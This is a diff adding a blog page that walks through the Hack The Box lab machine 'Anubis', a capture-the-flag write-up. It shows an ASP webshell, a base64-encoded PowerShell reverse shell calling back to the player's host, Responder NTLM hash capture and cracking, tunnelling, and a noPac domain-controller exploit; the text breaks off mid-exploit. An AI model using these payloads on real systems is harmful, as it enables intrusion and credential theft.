@@ -1,0 +1,474 @@
+<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="blog @ zexion.dev" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="blog @ zexion.dev" /> <title> Anubis - Hack The Box - blog @ zexion.dev </title> <link rel="alternate" href="http://localhost:4000/Anubis/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/Anubis/" /> <meta name="description" content="A Insane rated machine from Hack The Box" /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="Anubis - Hack The Box | zexionx00" /> <meta property="og:title" content="Anubis - Hack The Box | zexionx00" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/Anubis/" /> <meta property="og:description" content="A Insane rated machine from Hack The Box" /> <meta property="og:image" content="http://localhost:4000/assets/img/zexion.jpg" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="Anubis - Hack The Box | zexionx00" /> <meta name="twitter:url" content="http://localhost:4000/Anubis/" /> <meta name="twitter:site" content="@zexionx00" /> <meta name="twitter:creator" content="@zexionx00" /> <meta name="twitter:description" content="A Insane rated machine from Hack The Box" /> <meta name="twitter:image" content="http://localhost:4000/assets/img/zexion.jpg" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="blog @ zexion.dev" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a><a class="menu-link rss" href="/feed.xml"> <svg xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 512 512" fill="#ED812E" > <title>RSS</title> <path d="M108.56,342.78a60.34,60.34,0,1,0,60.56,60.44A60.63,60.63,0,0,0,108.56,342.78Z" /> <path d="M48,186.67v86.55c52,0,101.94,15.39,138.67,52.11s52,86.56,52,138.67h86.66C325.33,312.44,199.67,186.67,48,186.67Z" /> <path d="M48,48v86.56c185.25,0,329.22,144.08,329.22,329.44H464C464,234.66,277.67,48,48,48Z" /> </svg> </a> </div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#htb">HTB</a> </span> </div> <h1 class="header-title" itemprop="headline">Anubis - Hack The Box</h1> <div class="post-meta"> <time datetime="2021-08-15T01:00:07+01:00" itemprop="datePublished"> Aug 15, 2021 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">zexionx00</span> </span> <time hidden datetime="" itemprop="dateModified"> Aug 15, 2021 </time> <span hidden itemprop="publisher" itemtype="Person">zexionx00</span> <span hidden itemprop="image"></span> <span hidden itemprop="mainEntityOfPage"><figure> <img src="/assets/img/anubis/anubis.png" alt="anubis" /> <figcaption> Anubis - Hack The Box </figcaption> </figure> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <figure> <img src="/assets/img/anubis/anubis.png" alt="anubis" /> <figcaption> Anubis - Hack The Box </figcaption> </figure> <h1 id="introduction"> <a href="#introduction" class="anchor-head"></a> Introduction </h1> <p><a href="https://www.hackthebox.com/home/machines/profile/371" target="_blank" rel="noopener nofollow">Anubis</a> is insane rated machine from Hack The Box which includes Docker Escape in windows, unintended path of <a href="https://github.com/Ridter/noPac" target="_blank" rel="noopener nofollow">noPAC</a>. And finally, intended path of abusing <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noopener nofollow">ADCS</a>.</p> <h1 id="nmap"> <a href="#nmap" class="anchor-head"></a> Nmap </h1> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Nmap 7.91 scan initiated Sat Jan 29 21:44:35 2022 as: nmap -sC -sV -vv -oA nmap/ports 10.10.11.102</span>
+Nmap scan report <span class="k">for </span>10.10.11.102
+Host is up, received echo-reply ttl 127 <span class="o">(</span>0.37s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-01-29 21:44:36 EST <span class="k">for </span>138s
+Not shown: 996 filtered ports
+Reason: 996 no-responses
+PORT    STATE SERVICE       REASON          VERSION
+135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+443/tcp open  ssl/http      syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.windcorp.htb
+| Subject Alternative Name: DNS:www.windcorp.htb
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>www.windcorp.htb
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-05-24T19:44:56
+| Not valid after:  2031-05-24T19:54:56
+| MD5:   e2e7 86ef 4095 9908 14c5 3347 cdcb 4167
+| SHA-1: 7fce 781f 883c a27e 1154 4502 1686 ee65 7551 0e2a
+| <span class="nt">-----BEGIN</span> CERTIFICATE-----
+| MIIDLTCCAhWgAwIBAgIQGTQcHTu8XrtFZ6hwEkAoKTANBgkqhkiG9w0BAQsFADAb
+| MRkwFwYDVQQDDBB3d3cud2luZGNvcnAuaHRiMB4XDTIxMDUyNDE5NDQ1NloXDTMx
+| MDUyNDE5NTQ1NlowGzEZMBcGA1UEAwwQd3d3LndpbmRjb3JwLmh0YjCCASIwDQYJ
+| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAK79Y9DwPj7s4/vGfCx8Smiq921EsKI9
+| UQLB6ctOlXifp+YGwRKmDjPiRBsRaBcrQJyW8B3s8NKU1mt8dIX0bbn6gqBezeXg
+| cu+VXV/5HJmVQ5jxNe02NoY1l+5UBvmfpwRJmUvW+mO5dShhilDsNjPYYhydbme9
+| ap6UeFG7zwHfDKywUAFonbyxZcmFvaWUbbswNh0Hc0l7qAIddU8+O4azNNLzBgot
+| dstmd5PXMXtX4bdvupAV+PIhsu8ddsbSFAKxh7GLnmNDUv0/Jy1IQRfvpnjFNWAL
+| oeQzNmNnzCTNgoB9V7eAnPXCOLulq2geCaJ19WlYRrMc+lzIR/C4wB0CAwEAAaNt
+| MGswDgYDVR0PAQH/BAQDAgWgMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
+| ATAbBgNVHREEFDASghB3d3cud2luZGNvcnAuaHRiMB0GA1UdDgQWBBQu0cbQ/zqK
+| aIeIy021WpVKOzBX8TANBgkqhkiG9w0BAQsFAAOCAQEAiyR1RyIWHuLR17cb45U+
+| 3rmflhQozUfNm1QMTGXQerX1s5p+Uw0rh7OdJe4VTE7smVPHiFJYzMlrvxl3p6Ur
+| UREF7ymW6NkriFZFSFKswHlWR9o5UwNG2QUAN8VjHBuOZT1LP8vgxRT290xh9G2w
+| i3Y3R5WA5FLYPYbNBJ7FZUbdMUkvQZI2DL9bd3ZLptqqlk/62kDrIRN2ctq8R6+c
+| C+h4MLd5L8Eoftf+5r1SrxTg3cD7ex2bm5cZmLhmtEYA6L1RkUPuf132Fb98URSE
+| +heFt1xpfM/EREhI+iwhFhTsDydrebtm9/HlxmDhd8OJqsFXmPWd6cw/llxONk9c
+| <span class="nv">bA</span><span class="o">==</span>
+|_-----END CERTIFICATE-----
+|_ssl-date: 2022-01-30T02:46:47+00:00<span class="p">;</span> +1s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+445/tcp open  microsoft-ds? syn-ack ttl 127
+593/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+| p2p-conficker: 
+|   Checking <span class="k">for </span>Conficker.C or higher...
+|   Check 1 <span class="o">(</span>port 17975/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 2 <span class="o">(</span>port 29705/tcp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 3 <span class="o">(</span>port 30756/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|   Check 4 <span class="o">(</span>port 19663/udp<span class="o">)</span>: CLEAN <span class="o">(</span>Timeout<span class="o">)</span>
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   <span class="nb">date</span>: 2022-01-30T02:45:36
+|_  start_date: N/A
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sat Jan 29 21:46:54 2022 -- 1 IP address (1 host up) scanned in 139.41 seconds</span></code></pre></figure> <p>Nmap leaks the hostname www.windcorp.htb. So, we add it to our hosts file and move on.</p> <h1 id="web"> <a href="#web" class="anchor-head"></a> Web </h1> <p>Everything looks fine but the contact form doesn’t. When we submit a contact request, its actually reflecting our request to /preview.asp which is often vulnerable to SSTI, Template Injection, XSS. And since this is running asp, upon sending a asp webshell, we get a hit here.</p> <figure> <img src="/assets/img/anubis/check.png" alt="Reflect" /> <figcaption> Request Reflect </figcaption> </figure> <p>And <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp" target="_blank" rel="noopener nofollow">Cmd WebShell</a></p> <figure> <img src="/assets/img/anubis/cmd.png" alt="cmd" /> <figcaption> CMD ASPSHELL </figcaption> </figure> <h1 id="reverse-shell"> <a href="#reverse-shell" class="anchor-head"></a> Reverse Shell </h1> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% <span class="nb">cat </span>shell.ps1 | iconv <span class="nt">-t</span> utf-16le | <span class="nb">base64</span> <span class="nt">-w</span> 0<span class="p">;</span> <span class="nb">echo
+</span><span class="nv">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQA0ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA</span><span class="o">=</span></code></pre></figure> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% rlwrap nc <span class="nt">-lvnp</span> 1337
+listening on <span class="o">[</span>any] 1337 ...
+connect to <span class="o">[</span>10.10.14.54] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.102] 49901
+<span class="nb">whoami
+</span>nt authority<span class="se">\s</span>ystem
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; </code></pre></figure> <p>But we are not done with the box. We have a shell as Administrator in a container. We can verify that with its IP.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">PS C:<span class="se">\u</span>sers<span class="se">\a</span>dministrator<span class="se">\d</span>esktop&gt; ipconfig
+Windows IP Configuration
+
+
+Ethernet adapter vEthernet <span class="o">(</span>Ethernet<span class="o">)</span>:
+
+   Connection-specific DNS Suffix  <span class="nb">.</span> : htb
+   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::bc0e:be96:fb13:edc4%32
+   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 172.20.62.109
+   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.240.0
+   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 172.20.48.1 </code></pre></figure> <p>After some enums on the machine, we get a req.txt in Administrator’s desktop which is a certificate that can be decoded with opennsl. We get a FQDN softwareportal.windcorp.htb . So, we add the gateway with our FQDN. But we cannot access the endpoint without any proxy. So, lets start a chisel server.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">openssl req <span class="nt">-in</span> req.txt <span class="nt">-text</span>
+Certificate Request:
+    Data:
+        Version: 1 <span class="o">(</span>0x0<span class="o">)</span>
+        Subject: C <span class="o">=</span> AU, ST <span class="o">=</span> Some-State, O <span class="o">=</span> WindCorp, CN <span class="o">=</span> softwareportal.windcorp.htb
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                RSA Public-Key: <span class="o">(</span>2048 bit<span class="o">)</span>
+                Modulus:
+                    00:a6:9b:4a:ff:85:91:c2:2a:c2:bf:04:3e:ce:15:
+                    d2:f6:23:db:c5:f2:82:1e:6a:13:12:f4:b6:fd:b1:
+                    32:44:14:24:c7:1b:10:9d:85:15:fe:c6:d8:ac:44:
+                    1b:c0:00:51:0e:b8:f5:14:05:62:9b:04:41:c8:1f:
+                    66:e1:18:47:c2:7a:78:48:2e:5f:fd:45:10:ae:00:
+                    a2:f4:8a:e8:f6:9d:02:ab:1d:0d:43:cc:31:15:b8:
+                    89:19:9d:36:a4:8f:70:3e:02:1b:d3:3e:7b:4b:78:
+                    48:0d:7f:99:77:dd:c6:ce:70:72:05:9b:70:bd:db:
+                    f7:1f:d8:8b:e3:1e:16:89:59:bf:b8:6b:fe:8f:81:
+                    39:5c:c4:13:27:7b:93:ac:47:ee:21:73:86:08:84:
+                    b9:f3:40:ca:15:52:ac:bb:c0:8d:d5:67:6b:63:4a:
+                    1e:92:8a:23:d4:e3:e5:60:fe:7b:f1:ff:f6:0d:c8:
+                    46:ac:de:68:c0:fc:34:99:89:cc:ec:a8:3b:c2:34:
+                    <span class="nb">cd</span>:b8:61:93:aa:aa:65:48:c6:59:90:08:02:b8:5a:
+                    ca:3b:1c:cc:21:68:a9:6e:7b:77:2e:dc:fa:45:3a:
+                    ff:88:27:d6:a5:b0:d5:ad:f3:17:53:b5:51:22:a4:
+                    26:70:59:13:c5:bc:61:6e:d7:1e:79:4a:fb:38:d4:
+                    a7:77
+                Exponent: 65537 <span class="o">(</span>0x10001<span class="o">)</span>
+        Attributes:
+            a0:00
+    Signature Algorithm: sha256WithRSAEncryption
+         6b:ac:75:c1:11:97:70:30:62:4c:0f:87:27:33:07:96:36:9b:
+         63:91:72:c9:3a:0b:50:30:09:23:5e:f3:24:bc:46:81:51:54:
+         79:5c:5d:61:ed:1b:af:d2:fd:d6:2b:3b:9a:e8:50:f1:2f:6c:
+         d8:ac:b5:8b:2d:8f:59:6e:63:8a:de:cc:70:f6:7a:f0:da:e6:
+         6d:8c:25:bc:d5:ac:17:ba:5c:67:b2:d8:54:6d:b8:57:9e:ec:
+         21:d1:7f:33:3a:11:dc:3a:6a:3b:94:ff:0e:6f:60:37:23:ad:
+         c8:a4:27:9a:13:08:a3:8d:65:d5:fd:9c:7c:57:dc:a8:c8:e9:
+         5d:cc:1a:1e:2c:7b:6c:29:71:56:86:d6:a2:59:79:bf:6f:b8:
+         5f:04:cf:69:a3:45:86:d6:f2:f0:0d:45:17:4f:4d:0d:2a:7c:
+         67:c2:4c:c9:51:91:c7:61:6f:1a:b2:77:f6:f2:2b:8e:53:0c:
+         28:58:fa:33:71:80:99:db:c7:f8:83:bf:0f:90:7a:24:21:04:
+         <span class="nb">dd</span>:a9:ae:c5:4d:38:08:81:f0:08:8e:42:d3:84:f6:29:a0:8d:
+         e1:4e:b5:d7:63:c3:21:2d:2d:3a:e6:41:8f:c8:1d:60:8b:20:
+         05:8b:05:0d:e0:ed:a7:6d:e0:e0:9b:11:e9:2a:2c:12:2b:28:
+         e1:39:70:a5
+<span class="nt">-----BEGIN</span> CERTIFICATE REQUEST-----
+MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
+ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
+Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
+KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
+BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
+eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
+QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
+qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
+1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
+JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
+WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
+yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
+F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
+CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
+<span class="nv">4TlwpQ</span><span class="o">==</span>
+<span class="nt">-----END</span> CERTIFICATE REQUEST-----</code></pre></figure> <p>VM,</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% ./chisel.elf server <span class="nt">-p</span> 8000 <span class="nt">--reverse</span>
+2022/01/29 22:19:37 server: Reverse tunnelling enabled
+2022/01/29 22:19:37 server: Fingerprint <span class="nv">U0rSx35TiFy2cgvz2lvetA6pPiCzOeEQ9uamyz2OHS0</span><span class="o">=</span>
+2022/01/29 22:19:37 server: Listening on http://0.0.0.0:8000
+2022/01/29 22:20:05 server: session#1: tun: proxy#R:127.0.0.1:1080<span class="o">=&gt;</span>socks: Listening</code></pre></figure> <p>Server,</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">.<span class="se">\c</span>hisel.exe client 10.10.14.54:8000 R:socks</code></pre></figure> <p>You might just add it to your proxychains.conf, but since I will be doing this in firefox, I just going to add the FQDN to my hosts file, and then change the firefox’s proxy to go through socks5 proxy here.</p> <figure> <img src="/assets/img/anubis/sock.png" alt="Proxy" /> <figcaption> Proxy through firefox </figcaption> </figure> <p>And now we get a page. There are Our Software index, which has goes to install.asp, but also the IP of the machine. So, if we change the IP to our box, and try to capture the hash, it’d be great. And we do so, and indeed get a hit as localadmin with NTLM hash. After cracking we find out it works for SMB.</p> <figure> <img src="/assets/img/anubis/fqdn.png" alt="Webpage" /> <figcaption> Softwares </figcaption> </figure> <p>Responder,</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>+] Current Session Variables:                 
+    Responder Machine Name     <span class="o">[</span>WIN-4CDJGCYRAKD]
+    Responder Domain Name      <span class="o">[</span>1KWR.LOCAL]
+    Responder DCE-RPC Port     <span class="o">[</span>46662]
+                                                                                               
+<span class="o">[</span>+] Listening <span class="k">for </span>events...                
+                                               
+<span class="o">[</span>WinRM] NTLMv2 Client   : 10.10.11.102
+<span class="o">[</span>WinRM] NTLMv2 Username : windcorp<span class="se">\l</span>ocaladmin
+<span class="o">[</span>WinRM] NTLMv2 Hash     : localadmin::windcorp:6fb6994acf69cc7a:6DADA07DAC31D5FDF40DE78B2E3F3F0C:0101000000000000578C51DF8C15D801FE0E53FF2B7CCD3A000000000200080031004B005700520001001E0057004
+9004E002D003400430044004A00470043005900520041004B0044000400140031004B00570052002E004C004F00430041004C0003003400570049004E002D003400430044004A00470043005900520041004B0044002E0031004B005700520
+02E004C004F00430041004C000500140031004B00570052002E004C004F00430041004C0008003000300000000000000000000000002100002173FE7CFB71082C80F6EEEB287AF563F563DE9B7E2FC3B377A156F2A076C6340A00100000000
+0000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00350034000000000000000000</code></pre></figure> <p>Request,</p> <figure> <img src="/assets/img/anubis/install.png" alt="Request" /> <figcaption> Request to our server </figcaption> </figure> <h1 id="smb"> <a href="#smb" class="anchor-head"></a> SMB </h1> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash 
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+Secret123        <span class="o">(</span>localadmin<span class="o">)</span>
+1g 0:00:00:03 DONE <span class="o">(</span>2022-01-29 22:55<span class="o">)</span> 0.3012g/s 630438p/s 630438c/s 630438C/s Smudge2..SaS1993
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed
+
+% smbclient <span class="nt">-L</span> <span class="se">\\\\</span>10.10.11.102 <span class="nt">-U</span> localadmin
+Enter WORKGROUP<span class="se">\l</span>ocaladmin<span class="s1">'s password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        CertEnroll      Disk      Active Directory Certificate Services share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Shared          Disk      
+        SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available</span></code></pre></figure> <h1 id="root"> <a href="#root" class="anchor-head"></a> Root </h1> <p>But here for the noPac exploit running, we need to add the proxychains. So, let’s do it. Since, we already have a socks5 proxy running, let’s just add it to config file.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% <span class="nb">echo</span> <span class="s2">"socks5 127.0.0.1 1080"</span> <span class="o">&gt;&gt;</span> /etc/proxychains.conf</code></pre></figure> <p>And we have shell as NT Authority\SYSTEM in the box.</p> <figure class="highlight"><pre><code class="language-bash" data-lang="bash">% <span class="nb">sudo </span>proxychains <span class="nt">-q</span> python3 /opt/noPac/noPac.py windcorp.htb/localadmin:<span class="s1">'Secret123'</span> <span class="nt">-dc-ip</span> 172.20.48.1 <span class="nt">-dc-host</span> EARTH <span class="nt">-shell</span> <span class="nt">--impersonate</span> administrator
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+                                           
+                                        
+    
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Current ms-DS-MachineAccountQuota <span class="o">=</span> 10
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Selected Target EARTH.windcorp.htb
